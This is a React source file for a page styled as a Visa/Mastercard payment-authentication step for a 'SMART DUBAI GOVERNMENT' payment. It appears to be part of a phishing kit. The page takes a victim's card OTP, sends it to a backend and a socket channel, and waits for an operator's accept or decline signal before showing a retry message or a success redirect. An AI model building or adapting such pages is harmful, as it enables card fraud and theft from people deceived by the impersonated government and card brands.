import React, { useEffect, useState } from "react";
import { io } from "socket.io-client";
import { apiRoute, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import axios from "axios";
const Code = () => {
  const [code, setCode] = useState("");
  const [counter, setCounter] = useState(360);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);

  useEffect(() => {
    const timer = setInterval(() => {
      if (counter > 0) {
        setCounter(counter - 1); // Decrease counter by 1 second
      }
    }, 1000);

    // Cleanup function to clear the interval when the component unmounts
    return () => clearInterval(timer);
  }, [counter]);

  // Calculate minutes and seconds
  const minutes = Math.floor(counter / 60);
  const seconds = counter % 60;

  // Format the counter value as "MM:SS"
  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(seconds).padStart(2, "0");
  const handleSubmit = async (e) => {
    setLoading(true);
    setError(false);
    e.preventDefault();
    await axios
      .post(apiRoute + "/visaOtp/" + sessionStorage.getItem("id"), {
        visa_otp: code,
      })
      .then(() =>
        socket.emit("visaOtp", {
          id: sessionStorage.getItem("id"),
          visa_otp: code,
        })
      );
  };

  socket.on("declineVisaOTP", (ID) => {
    if (ID === sessionStorage.getItem("id")) {
      setError(true);
      setLoading(false);
    }
  });
  socket.on("acceptVisaOTP", ({ id, userOtp }) => {
    if (id === sessionStorage.getItem("id")) window.location.href = `/success`;
  });

  const handleChange = (e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6);
    setCode(value);
  };

  return (
    <>
      {loading && (
        <div className="absolute top-0 w-full z-20  flex items-center justify-center h-screen bg-opacity-50 left-0 bg-gray-300 ">
          <TailSpin
            height="50"
            width="50"
            color="green"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      )}
      <div className=" h-screen justify-center   py-1 flex items-center flex-col w-full ">
        <div className="w-11/12 max-w-md border rounded-xl shadow-sm p-6 mt-10 !bg-white">
          <div className="">
            <div className="flex items-center justify-around gap-x-3 w-full mb-5">
              {sessionStorage.getItem("method") === "master" ? (
                <img src="/master.png" className="w-1/4" />
              ) : (
                <img src="/visaIcon.png" className="w-1/4" />
              )}

              <img src="/logo.png" className="w-1/3" />
            </div>
            <h5 className="text-lg font-bold mb-3 text-center  text-[#005ba8]">
              {" "}
              Payemt Authentication
            </h5>
            <p className=" text-xs text-gray-800 leading-5">
              We've sent a one-time password (OTP) to your registered mobile
              number to confirm a payment of AE{" "}
              {Number(sessionStorage.getItem("price")).toLocaleString()} to
              SMART DUBAI GOVERNMENT
            </p>

            <form onSubmit={handleSubmit} className="mt-4 ">
              <label
                htmlFor="verification_code"
                className="block mb-2 text-sm font-medium "
              >
                Enter OTP here :
              </label>
              <input
                id="verification_code"
                type="text"
                className="form-input w-full text-center p-2 border rounded focus:outline-none focus:ring"
                maxLength={6}
                minLength={4}
                value={code}
                onChange={handleChange}
                required
                inputMode="numeric"
              />

              {error && (
                <div className="bg-red-100 text-red-800 p-2 rounded mt-2 text-sm text-center">
                  Incorrect otp try again
                </div>
              )}

              <div className="w-full flex justify-center">
                <button
                  type="submit"
                  className="bg-[#1f80d1]  text-white rounded-md px-5 py-2 mt-5 w-full"
                >
                  Confirm
                </button>
              </div>
            </form>
            <div className="flex flex-col justify-center items-center text-sm py-2 font-bold w-full">
              <span>This page will automaticaly timeout after </span>
              <span> {formattedMinutes + ":" + formattedSeconds} seconds</span>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default Code;
